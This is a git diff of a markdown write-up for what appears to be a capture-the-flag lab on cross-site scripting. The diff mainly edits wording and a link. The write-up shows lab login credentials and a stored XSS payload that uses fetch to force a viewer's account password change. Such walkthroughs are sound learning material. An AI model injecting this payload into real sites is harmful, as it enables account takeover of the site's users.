@@ -1,6 +1,6 @@
 # XSS Vulnerability
 
-[!If you want to check my notes about IDORs](https://github.com/itKhalid143/websec365/blob/main/Days/Day10-XSS.md)
+[If you want to check my notes about XSS](https://github.com/itKhalid143/websec365/blob/main/Days/Day10-XSS.md)
 
 ***
 ## First we're logging using the given Credentials!
@@ -12,14 +12,13 @@ Password: password
 ```
 ![****](/Advent%20of%20Cyber%203/Screenshots/Task5/login.PNG)
 
-## Then we're hopping to a blog to inject our malicious script!
+## Then we're hopping to a blog post to inject our malicious script!
 ```js
 <script>fetch('/settings?new_password=pass123');</script>
 ``` 
-```js
-<script>/* */</script> #Allows use to run Javascripts inside our page
-```
-```fetch``` function makes a network request to the specified URL.
+- ```<script> Text in Between </script> ``` Allows use to run Javascripts inside our page.
+
+- ```fetch``` function makes a network request to the specified URL.
 
 ![****](/Advent%20of%20Cyber%203/Screenshots/Task5/1.PNG)
 
